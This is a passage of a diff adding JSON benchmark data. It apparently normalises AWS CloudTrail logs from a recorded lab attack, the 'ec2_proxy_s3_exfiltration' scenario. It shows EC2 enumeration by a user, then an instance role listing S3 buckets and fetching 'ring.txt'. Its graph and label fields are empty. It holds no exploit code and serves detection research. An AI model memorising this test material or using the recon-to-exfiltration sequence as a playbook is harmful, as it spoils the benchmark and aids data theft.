+            "member_path": "ec2_proxy_s3_exfiltration_2020-09-14011940.json",
+            "member_sha256": "9cfc6675f59b666cee6e6f0bcb72b1034ea4bbcdaf19c0f02b3092317128289b",
+            "record_index": 85,
+            "event_id": "d4ea45a9-8fde-4938-9911-e743cb97a2a3"
+          },
+          "path_label": null,
+          "evidence_state": null
+        },
+        {
+          "observation_id": "obs-c78e777b567055ca811d5a42",
+          "candidate_id": "cloudgoat:aws:cloud_breach_s3",
+          "schema": "aws_cloudtrail",
+          "timestamp": "2020-09-14T00:53:58.000Z",
+          "service": "ec2.amazonaws.com",
+          "operation": "DescribeHosts",
+          "actor_type": "IAMUser",
+          "actor_id": "arn:aws:iam::123456789123:user/pedro",
+          "source_ip": "1.2.3.4",
+          "account_id": "123456789123",
+          "region": "us-east-1",
+          "event_status": "Success",
+          "request": {
+            "DescribeHostsRequest": {
+              "MaxResults": 100
+            }
+          },
+          "response": null,
+          "raw_ref": {
+            "archive_relative_path": "data/real_sources/raw/otrf_security_datasets/d9d40ef123d2c87d5d3df28c96bcab4f0faccc87/ec2_proxy_s3_exfiltration.zip",
+            "archive_sha256": "83cc349afa5672ae46fc38a824946b470f2f3fa39f22889b59dce9fda43fe74d",
+            "member_path": "ec2_proxy_s3_exfiltration_2020-09-14011940.json",
+            "member_sha256": "9cfc6675f59b666cee6e6f0bcb72b1034ea4bbcdaf19c0f02b3092317128289b",
+            "record_index": 86,
+            "event_id": "3096b6fd-66f1-49a7-8da8-e9af6b55939e"
+          },
+          "path_label": null,
+          "evidence_state": null
+        },
+        {
+          "observation_id": "obs-20bd61d26667eb3a2b0721d6",
+          "candidate_id": "cloudgoat:aws:cloud_breach_s3",
+          "schema": "aws_cloudtrail",
+          "timestamp": "2020-09-14T00:53:58.000Z",
+          "service": "ec2.amazonaws.com",
+          "operation": "DescribeInstanceStatus",
+          "actor_type": "IAMUser",
+          "actor_id": "arn:aws:iam::123456789123:user/pedro",
+          "source_ip": "1.2.3.4",
+          "account_id": "123456789123",
+          "region": "us-east-1",
+          "event_status": "Success",
+          "request": {
+            "instancesSet": {},
+            "includeAllInstances": false,
+            "filterSet": {}
+          },
+          "response": null,
+          "raw_ref": {
+            "archive_relative_path": "data/real_sources/raw/otrf_security_datasets/d9d40ef123d2c87d5d3df28c96bcab4f0faccc87/ec2_proxy_s3_exfiltration.zip",
+            "archive_sha256": "83cc349afa5672ae46fc38a824946b470f2f3fa39f22889b59dce9fda43fe74d",
+            "member_path": "ec2_proxy_s3_exfiltration_2020-09-14011940.json",
+            "member_sha256": "9cfc6675f59b666cee6e6f0bcb72b1034ea4bbcdaf19c0f02b3092317128289b",
+            "record_index": 87,
+            "event_id": "ab9a1cbb-a698-4f6d-85d2-2bdc4b67f12c"
+          },
+          "path_label": null,
+          "evidence_state": null
+        },
+        {
+          "observation_id": "obs-e67cc6ba33cb4bb7826eb90a",
+          "candidate_id": "cloudgoat:aws:cloud_breach_s3",
+          "schema": "aws_cloudtrail",
+          "timestamp": "2020-09-14T00:53:58.000Z",
+          "service": "ec2.amazonaws.com",
+          "operation": "DescribeInstances",
+          "actor_type": "IAMUser",
+          "actor_id": "arn:aws:iam::123456789123:user/pedro",
+          "source_ip": "1.2.3.4",
+          "account_id": "123456789123",
+          "region": "us-east-1",
+          "event_status": "Success",
+          "request": {
+            "instancesSet": {},
+            "filterSet": {
+              "items": [
+                {
+                  "valueSet": {
+                    "items": [
+                      {
+                        "value": "16"
+                      }
+                    ]
+                  },
+                  "name": "instance-state-code"
+                }
+              ]
+            },
+            "maxResults": 1000
+          },
+          "response": null,
+          "raw_ref": {
+            "archive_relative_path": "data/real_sources/raw/otrf_security_datasets/d9d40ef123d2c87d5d3df28c96bcab4f0faccc87/ec2_proxy_s3_exfiltration.zip",
+            "archive_sha256": "83cc349afa5672ae46fc38a824946b470f2f3fa39f22889b59dce9fda43fe74d",
+            "member_path": "ec2_proxy_s3_exfiltration_2020-09-14011940.json",
+            "member_sha256": "9cfc6675f59b666cee6e6f0bcb72b1034ea4bbcdaf19c0f02b3092317128289b",
+            "record_index": 88,
+            "event_id": "6e47bb14-a425-45d8-94da-8f0196ea93b2"
+          },
+          "path_label": null,
+          "evidence_state": null
+        },
+        {
+          "observation_id": "obs-793ae11e992f7ae3e86eabe6",
+          "candidate_id": "cloudgoat:aws:cloud_breach_s3",
+          "schema": "aws_cloudtrail",
+          "timestamp": "2020-09-14T00:53:58.000Z",
+          "service": "ec2.amazonaws.com",
+          "operation": "DescribePlacementGroups",
+          "actor_type": "IAMUser",
+          "actor_id": "arn:aws:iam::123456789123:user/pedro",
+          "source_ip": "1.2.3.4",
+          "account_id": "123456789123",
+          "region": "us-east-1",
+          "event_status": "Success",
+          "request": {
+            "placementGroupIdSet": {},
+            "placementGroupSet": {},
+            "filterSet": {}
+          },
+          "response": null,
+          "raw_ref": {
+            "archive_relative_path": "data/real_sources/raw/otrf_security_datasets/d9d40ef123d2c87d5d3df28c96bcab4f0faccc87/ec2_proxy_s3_exfiltration.zip",
+            "archive_sha256": "83cc349afa5672ae46fc38a824946b470f2f3fa39f22889b59dce9fda43fe74d",
+            "member_path": "ec2_proxy_s3_exfiltration_2020-09-14011940.json",
+            "member_sha256": "9cfc6675f59b666cee6e6f0bcb72b1034ea4bbcdaf19c0f02b3092317128289b",
+            "record_index": 89,
+            "event_id": "c573f313-0f35-4c68-a479-6daf7713a6e2"
+          },
+          "path_label": null,
+          "evidence_state": null
+        },
+        {
+          "observation_id": "obs-ca51b045c415128af7347b48",
+          "candidate_id": "cloudgoat:aws:cloud_breach_s3",
+          "schema": "aws_cloudtrail",
+          "timestamp": "2020-09-14T00:53:58.000Z",
+          "service": "ec2.amazonaws.com",
+          "operation": "DescribeAccountAttributes",
+          "actor_type": "IAMUser",
+          "actor_id": "arn:aws:iam::123456789123:user/pedro",
+          "source_ip": "1.2.3.4",
+          "account_id": "123456789123",
+          "region": "us-east-1",
+          "event_status": "Success",
+          "request": {
+            "accountAttributeNameSet": {
+              "items": [
+                {
+                  "attributeName": "default-vpc"
+                }
+              ]
+            },
+            "filterSet": {}
+          },
+          "response": null,
+          "raw_ref": {
+            "archive_relative_path": "data/real_sources/raw/otrf_security_datasets/d9d40ef123d2c87d5d3df28c96bcab4f0faccc87/ec2_proxy_s3_exfiltration.zip",
+            "archive_sha256": "83cc349afa5672ae46fc38a824946b470f2f3fa39f22889b59dce9fda43fe74d",
+            "member_path": "ec2_proxy_s3_exfiltration_2020-09-14011940.json",
+            "member_sha256": "9cfc6675f59b666cee6e6f0bcb72b1034ea4bbcdaf19c0f02b3092317128289b",
+            "record_index": 90,
+            "event_id": "e27095b8-a9ed-4e1a-a8ac-0d07bf4cd970"
+          },
+          "path_label": null,
+          "evidence_state": null
+        },
+        {
+          "observation_id": "obs-45efabe9fc91c22d2cabeed7",
+          "candidate_id": "cloudgoat:aws:cloud_breach_s3",
+          "schema": "aws_cloudtrail",
+          "timestamp": "2020-09-14T00:53:58.000Z",
+          "service": "ec2.amazonaws.com",
+          "operation": "DescribeAccountAttributes",
+          "actor_type": "IAMUser",
+          "actor_id": "arn:aws:iam::123456789123:user/pedro",
+          "source_ip": "1.2.3.4",
+          "account_id": "123456789123",
+          "region": "us-east-1",
+          "event_status": "Success",
+          "request": {
+            "accountAttributeNameSet": {
+              "items": [
+                {
+                  "attributeName": "supported-platforms"
+                }
+              ]
+            },
+            "filterSet": {}
+          },
+          "response": null,
+          "raw_ref": {
+            "archive_relative_path": "data/real_sources/raw/otrf_security_datasets/d9d40ef123d2c87d5d3df28c96bcab4f0faccc87/ec2_proxy_s3_exfiltration.zip",
+            "archive_sha256": "83cc349afa5672ae46fc38a824946b470f2f3fa39f22889b59dce9fda43fe74d",
+            "member_path": "ec2_proxy_s3_exfiltration_2020-09-14011940.json",
+            "member_sha256": "9cfc6675f59b666cee6e6f0bcb72b1034ea4bbcdaf19c0f02b3092317128289b",
+            "record_index": 91,
+            "event_id": "2672c09f-b83d-4e9f-8c54-7db32a53c3bd"
+          },
+          "path_label": null,
+          "evidence_state": null
+        },
+        {
+          "observation_id": "obs-ad9daf9214bc4fdee830117d",
+          "candidate_id": "cloudgoat:aws:cloud_breach_s3",
+          "schema": "aws_cloudtrail",
+          "timestamp": "2020-09-14T00:53:58.000Z",
+          "service": "ec2.amazonaws.com",
+          "operation": "DescribeSecurityGroups",
+          "actor_type": "IAMUser",
+          "actor_id": "arn:aws:iam::123456789123:user/pedro",
+          "source_ip": "1.2.3.4",
+          "account_id": "123456789123",
+          "region": "us-east-1",
+          "event_status": "Success",
+          "request": {
+            "securityGroupSet": {},
+            "filterSet": {},
+            "maxResults": 1000,
+            "securityGroupIdSet": {}
+          },
+          "response": null,
+          "raw_ref": {
+            "archive_relative_path": "data/real_sources/raw/otrf_security_datasets/d9d40ef123d2c87d5d3df28c96bcab4f0faccc87/ec2_proxy_s3_exfiltration.zip",
+            "archive_sha256": "83cc349afa5672ae46fc38a824946b470f2f3fa39f22889b59dce9fda43fe74d",
+            "member_path": "ec2_proxy_s3_exfiltration_2020-09-14011940.json",
+            "member_sha256": "9cfc6675f59b666cee6e6f0bcb72b1034ea4bbcdaf19c0f02b3092317128289b",
+            "record_index": 92,
+            "event_id": "febafbe4-bc57-412e-8aeb-a9a986f48882"
+          },
+          "path_label": null,
+          "evidence_state": null
+        },
+        {
+          "observation_id": "obs-abeb9d236fcc3ef5d197af24",
+          "candidate_id": "cloudgoat:aws:cloud_breach_s3",
+          "schema": "aws_cloudtrail",
+          "timestamp": "2020-09-14T00:53:58.000Z",
+          "service": "ec2.amazonaws.com",
+          "operation": "DescribeAddresses",
+          "actor_type": "IAMUser",
+          "actor_id": "arn:aws:iam::123456789123:user/pedro",
+          "source_ip": "1.2.3.4",
+          "account_id": "123456789123",
+          "region": "us-east-1",
+          "event_status": "Success",
+          "request": {
+            "filterSet": {},
+            "allocationIdsSet": {},
+            "publicIpsSet": {}
+          },
+          "response": null,
+          "raw_ref": {
+            "archive_relative_path": "data/real_sources/raw/otrf_security_datasets/d9d40ef123d2c87d5d3df28c96bcab4f0faccc87/ec2_proxy_s3_exfiltration.zip",
+            "archive_sha256": "83cc349afa5672ae46fc38a824946b470f2f3fa39f22889b59dce9fda43fe74d",
+            "member_path": "ec2_proxy_s3_exfiltration_2020-09-14011940.json",
+            "member_sha256": "9cfc6675f59b666cee6e6f0bcb72b1034ea4bbcdaf19c0f02b3092317128289b",
+            "record_index": 93,
+            "event_id": "721f56fc-8e20-487a-826e-f0b374c98ac0"
+          },
+          "path_label": null,
+          "evidence_state": null
+        },
+        {
+          "observation_id": "obs-a71b3024748c215e81689d2a",
+          "candidate_id": "cloudgoat:aws:cloud_breach_s3",
+          "schema": "aws_cloudtrail",
+          "timestamp": "2020-09-14T00:53:58.000Z",
+          "service": "elasticloadbalancing.amazonaws.com",
+          "operation": "DescribeLoadBalancers",
+          "actor_type": "IAMUser",
+          "actor_id": "arn:aws:iam::123456789123:user/pedro",
+          "source_ip": "1.2.3.4",
+          "account_id": "123456789123",
+          "region": "us-east-1",
+          "event_status": "Success",
+          "request": null,
+          "response": null,
+          "raw_ref": {
+            "archive_relative_path": "data/real_sources/raw/otrf_security_datasets/d9d40ef123d2c87d5d3df28c96bcab4f0faccc87/ec2_proxy_s3_exfiltration.zip",
+            "archive_sha256": "83cc349afa5672ae46fc38a824946b470f2f3fa39f22889b59dce9fda43fe74d",
+            "member_path": "ec2_proxy_s3_exfiltration_2020-09-14011940.json",
+            "member_sha256": "9cfc6675f59b666cee6e6f0bcb72b1034ea4bbcdaf19c0f02b3092317128289b",
+            "record_index": 94,
+            "event_id": "97998cf1-fdcf-4d73-9bd3-0a5753d0c6e2"
+          },
+          "path_label": null,
+          "evidence_state": null
+        },
+        {
+          "observation_id": "obs-4c3e84ae4dd6934e864c101a",
+          "candidate_id": "cloudgoat:aws:cloud_breach_s3",
+          "schema": "aws_cloudtrail",
+          "timestamp": "2020-09-14T00:53:58.000Z",
+          "service": "ec2.amazonaws.com",
+          "operation": "DescribeSnapshots",
+          "actor_type": "IAMUser",
+          "actor_id": "arn:aws:iam::123456789123:user/pedro",
+          "source_ip": "1.2.3.4",
+          "account_id": "123456789123",
+          "region": "us-east-1",
+          "event_status": "Success",
+          "request": {
+            "sharedUsersSet": {},
+            "snapshotSet": {},
+            "ownersSet": {
+              "items": [
+                {
+                  "owner": "123456789123"
+                }
+              ]
+            },
+            "filterSet": {},
+            "maxResults": 1000
+          },
+          "response": null,
+          "raw_ref": {
+            "archive_relative_path": "data/real_sources/raw/otrf_security_datasets/d9d40ef123d2c87d5d3df28c96bcab4f0faccc87/ec2_proxy_s3_exfiltration.zip",
+            "archive_sha256": "83cc349afa5672ae46fc38a824946b470f2f3fa39f22889b59dce9fda43fe74d",
+            "member_path": "ec2_proxy_s3_exfiltration_2020-09-14011940.json",
+            "member_sha256": "9cfc6675f59b666cee6e6f0bcb72b1034ea4bbcdaf19c0f02b3092317128289b",
+            "record_index": 95,
+            "event_id": "a4c6a7a0-5b91-4d64-8ac1-229f95f05c67"
+          },
+          "path_label": null,
+          "evidence_state": null
+        },
+        {
+          "observation_id": "obs-9483050697fa3db4b908c278",
+          "candidate_id": "cloudgoat:aws:cloud_breach_s3",
+          "schema": "aws_cloudtrail",
+          "timestamp": "2020-09-14T00:53:58.000Z",
+          "service": "elasticloadbalancing.amazonaws.com",
+          "operation": "DescribeLoadBalancers",
+          "actor_type": "IAMUser",
+          "actor_id": "arn:aws:iam::123456789123:user/pedro",
+          "source_ip": "1.2.3.4",
+          "account_id": "123456789123",
+          "region": "us-east-1",
+          "event_status": "Success",
+          "request": null,
+          "response": null,
+          "raw_ref": {
+            "archive_relative_path": "data/real_sources/raw/otrf_security_datasets/d9d40ef123d2c87d5d3df28c96bcab4f0faccc87/ec2_proxy_s3_exfiltration.zip",
+            "archive_sha256": "83cc349afa5672ae46fc38a824946b470f2f3fa39f22889b59dce9fda43fe74d",
+            "member_path": "ec2_proxy_s3_exfiltration_2020-09-14011940.json",
+            "member_sha256": "9cfc6675f59b666cee6e6f0bcb72b1034ea4bbcdaf19c0f02b3092317128289b",
+            "record_index": 96,
+            "event_id": "0bfb4a18-6c30-4e64-81eb-0e195693eb69"
+          },
+          "path_label": null,
+          "evidence_state": null
+        },
+        {
+          "observation_id": "obs-c37281ea0d93a2fe1e9cf22b",
+          "candidate_id": "cloudgoat:aws:cloud_breach_s3",
+          "schema": "aws_cloudtrail",
+          "timestamp": "2020-09-14T01:01:50.000Z",
+          "service": "s3.amazonaws.com",
+          "operation": "ListBuckets",
+          "actor_type": "AssumedRole",
+          "actor_id": "arn:aws:sts::123456789123:assumed-role/MordorNginxStack-BankingWAFRole-9S3E0UAE1MM0/i-0317f6c6b66ae9c40",
+          "source_ip": "1.2.3.4",
+          "account_id": "123456789123",
+          "region": "us-east-1",
+          "event_status": "Success",
+          "request": {
+            "Host": "s3.amazonaws.com"
+          },
+          "response": null,
+          "raw_ref": {
+            "archive_relative_path": "data/real_sources/raw/otrf_security_datasets/d9d40ef123d2c87d5d3df28c96bcab4f0faccc87/ec2_proxy_s3_exfiltration.zip",
+            "archive_sha256": "83cc349afa5672ae46fc38a824946b470f2f3fa39f22889b59dce9fda43fe74d",
+            "member_path": "ec2_proxy_s3_exfiltration_2020-09-14011940.json",
+            "member_sha256": "9cfc6675f59b666cee6e6f0bcb72b1034ea4bbcdaf19c0f02b3092317128289b",
+            "record_index": 97,
+            "event_id": "19d32cc1-edab-4b96-9a11-2cd7794b2527"
+          },
+          "path_label": null,
+          "evidence_state": null
+        },
+        {
+          "observation_id": "obs-f9e01eb81609896f70ecbb5f",
+          "candidate_id": "cloudgoat:aws:cloud_breach_s3",
+          "schema": "aws_cloudtrail",
+          "timestamp": "2020-09-14T01:00:04.000Z",
+          "service": "s3.amazonaws.com",
+          "operation": "ListBuckets",
+          "actor_type": "AssumedRole",
+          "actor_id": "arn:aws:sts::123456789123:assumed-role/MordorNginxStack-BankingWAFRole-9S3E0UAE1MM0/i-0317f6c6b66ae9c40",
+          "source_ip": "1.2.3.4",
+          "account_id": "123456789123",
+          "region": "us-east-1",
+          "event_status": "Success",
+          "request": {
+            "Host": "s3.amazonaws.com"
+          },
+          "response": null,
+          "raw_ref": {
+            "archive_relative_path": "data/real_sources/raw/otrf_security_datasets/d9d40ef123d2c87d5d3df28c96bcab4f0faccc87/ec2_proxy_s3_exfiltration.zip",
+            "archive_sha256": "83cc349afa5672ae46fc38a824946b470f2f3fa39f22889b59dce9fda43fe74d",
+            "member_path": "ec2_proxy_s3_exfiltration_2020-09-14011940.json",
+            "member_sha256": "9cfc6675f59b666cee6e6f0bcb72b1034ea4bbcdaf19c0f02b3092317128289b",
+            "record_index": 98,
+            "event_id": "7d91ac29-614a-4af9-af5c-c5a80e63a0bb"
+          },
+          "path_label": null,
+          "evidence_state": null
+        },
+        {
+          "observation_id": "obs-eb8727e061caa3a3ce46a36c",
+          "candidate_id": "cloudgoat:aws:cloud_breach_s3",
+          "schema": "aws_cloudtrail",
+          "timestamp": "2020-09-14T01:12:40.000Z",
+          "service": "s3.amazonaws.com",
+          "operation": "ListObjects",
+          "actor_type": "AssumedRole",
+          "actor_id": "arn:aws:sts::123456789123:assumed-role/MordorNginxStack-BankingWAFRole-9S3E0UAE1MM0/i-0317f6c6b66ae9c40",
+          "source_ip": "1.2.3.4",
+          "account_id": "123456789123",
+          "region": "us-east-1",
+          "event_status": "Success",
+          "request": {
+            "Host": "mordors3stack-s3bucket-llp2yingx64a.s3.amazonaws.com",
+            "list-type": "2",
+            "prefix": "",
+            "encoding-type": "url",
+            "delimiter": "/",
+            "bucketName": "mordors3stack-s3bucket-llp2yingx64a"
+          },
+          "response": null,
+          "raw_ref": {
+            "archive_relative_path": "data/real_sources/raw/otrf_security_datasets/d9d40ef123d2c87d5d3df28c96bcab4f0faccc87/ec2_proxy_s3_exfiltration.zip",
+            "archive_sha256": "83cc349afa5672ae46fc38a824946b470f2f3fa39f22889b59dce9fda43fe74d",
+            "member_path": "ec2_proxy_s3_exfiltration_2020-09-14011940.json",
+            "member_sha256": "9cfc6675f59b666cee6e6f0bcb72b1034ea4bbcdaf19c0f02b3092317128289b",
+            "record_index": 99,
+            "event_id": "40266d7a-ea06-445b-875c-e17ea31b1bb4"
+          },
+          "path_label": null,
+          "evidence_state": null
+        },
+        {
+          "observation_id": "obs-9fee59ed04472543a02fc5a6",
+          "candidate_id": "cloudgoat:aws:cloud_breach_s3",
+          "schema": "aws_cloudtrail",
+          "timestamp": "2020-09-14T01:12:43.000Z",
+          "service": "s3.amazonaws.com",
+          "operation": "ListObjects",
+          "actor_type": "AssumedRole",
+          "actor_id": "arn:aws:sts::123456789123:assumed-role/MordorNginxStack-BankingWAFRole-9S3E0UAE1MM0/i-0317f6c6b66ae9c40",
+          "source_ip": "1.2.3.4",
+          "account_id": "123456789123",
+          "region": "us-east-1",
+          "event_status": "Success",
+          "request": {
+            "Host": "mordors3stack-s3bucket-llp2yingx64a.s3.amazonaws.com",
+            "list-type": "2",
+            "prefix": "",
+            "encoding-type": "url",
+            "delimiter": "/",
+            "bucketName": "mordors3stack-s3bucket-llp2yingx64a"
+          },
+          "response": null,
+          "raw_ref": {
+            "archive_relative_path": "data/real_sources/raw/otrf_security_datasets/d9d40ef123d2c87d5d3df28c96bcab4f0faccc87/ec2_proxy_s3_exfiltration.zip",
+            "archive_sha256": "83cc349afa5672ae46fc38a824946b470f2f3fa39f22889b59dce9fda43fe74d",
+            "member_path": "ec2_proxy_s3_exfiltration_2020-09-14011940.json",
+            "member_sha256": "9cfc6675f59b666cee6e6f0bcb72b1034ea4bbcdaf19c0f02b3092317128289b",
+            "record_index": 100,
+            "event_id": "fddb4992-b7e8-4c4a-bce5-31fee5c25667"
+          },
+          "path_label": null,
+          "evidence_state": null
+        },
+        {
+          "observation_id": "obs-45285f852926a867c60b419e",
+          "candidate_id": "cloudgoat:aws:cloud_breach_s3",
+          "schema": "aws_cloudtrail",
+          "timestamp": "2020-09-14T01:13:20.000Z",
+          "service": "s3.amazonaws.com",
+          "operation": "ListObjects",
+          "actor_type": "AssumedRole",
+          "actor_id": "arn:aws:sts::123456789123:assumed-role/MordorNginxStack-BankingWAFRole-9S3E0UAE1MM0/i-0317f6c6b66ae9c40",
+          "source_ip": "1.2.3.4",
+          "account_id": "123456789123",
+          "region": "us-east-1",
+          "event_status": "Success",
+          "request": {
+            "prefix": "",
+            "encoding-type": "url",
+            "Host": "mordors3stack-s3bucket-llp2yingx64a.s3.amazonaws.com",
+            "list-type": "2",
+            "bucketName": "mordors3stack-s3bucket-llp2yingx64a"
+          },
+          "response": null,
+          "raw_ref": {
+            "archive_relative_path": "data/real_sources/raw/otrf_security_datasets/d9d40ef123d2c87d5d3df28c96bcab4f0faccc87/ec2_proxy_s3_exfiltration.zip",
+            "archive_sha256": "83cc349afa5672ae46fc38a824946b470f2f3fa39f22889b59dce9fda43fe74d",
+            "member_path": "ec2_proxy_s3_exfiltration_2020-09-14011940.json",
+            "member_sha256": "9cfc6675f59b666cee6e6f0bcb72b1034ea4bbcdaf19c0f02b3092317128289b",
+            "record_index": 101,
+            "event_id": "e5a92162-e061-4d33-a39c-c2b8ec9dbf83"
+          },
+          "path_label": null,
+          "evidence_state": null
+        },
+        {
+          "observation_id": "obs-7bdbe1f3c7e324c6ba0e454b",
+          "candidate_id": "cloudgoat:aws:cloud_breach_s3",
+          "schema": "aws_cloudtrail",
+          "timestamp": "2020-09-14T01:13:20.000Z",
+          "service": "s3.amazonaws.com",
+          "operation": "GetObject",
+          "actor_type": "AssumedRole",
+          "actor_id": "arn:aws:sts::123456789123:assumed-role/MordorNginxStack-BankingWAFRole-9S3E0UAE1MM0/i-0317f6c6b66ae9c40",
+          "source_ip": "1.2.3.4",
+          "account_id": "123456789123",
+          "region": "us-east-1",
+          "event_status": "Success",
+          "request": {
+            "key": "ring.txt",
+            "Host": "mordors3stack-s3bucket-llp2yingx64a.s3.amazonaws.com",
+            "bucketName": "mordors3stack-s3bucket-llp2yingx64a"
+          },
+          "response": null,
+          "raw_ref": {
+            "archive_relative_path": "data/real_sources/raw/otrf_security_datasets/d9d40ef123d2c87d5d3df28c96bcab4f0faccc87/ec2_proxy_s3_exfiltration.zip",
+            "archive_sha256": "83cc349afa5672ae46fc38a824946b470f2f3fa39f22889b59dce9fda43fe74d",
+            "member_path": "ec2_proxy_s3_exfiltration_2020-09-14011940.json",
+            "member_sha256": "9cfc6675f59b666cee6e6f0bcb72b1034ea4bbcdaf19c0f02b3092317128289b",
+            "record_index": 102,
+            "event_id": "edc2222c-5063-47fb-9fc0-c2ffb86b9d15"
+          },
+          "path_label": null,
+          "evidence_state": null
+        }
+      ],
+      "observation_count": 103,
+      "selection_origin": "all 103 records copied from the sole pinned upstream member; no event, label or independence group generated"
+    }
+  ],
+  "source_context_fields": [
+    "candidate_metadata",
+    "runtime_instances",
+    "source",
+    "source_materials"
+  ],
+  "source_context_sha256": "7c79f26e3671288bdab8d6dc47f7fb9a3439a8635d4be17e19fe7e7ba45d9745",
+  "admission_screen": {
+    "external_or_low_privilege_entry_defined": null,
+    "multi_step_path_present": null,
+    "cloud_data_target_present": null,
+    "critical_edges_have_raw_evidence": null,
+    "not_a_near_duplicate": null,
+    "decision": null,
+    "rationale": null
+  },
+  "nodes": [],
+  "edges": [],
+  "path_labels": [],
+  "tool_tasks": [],
+  "instance_labels": []
+}
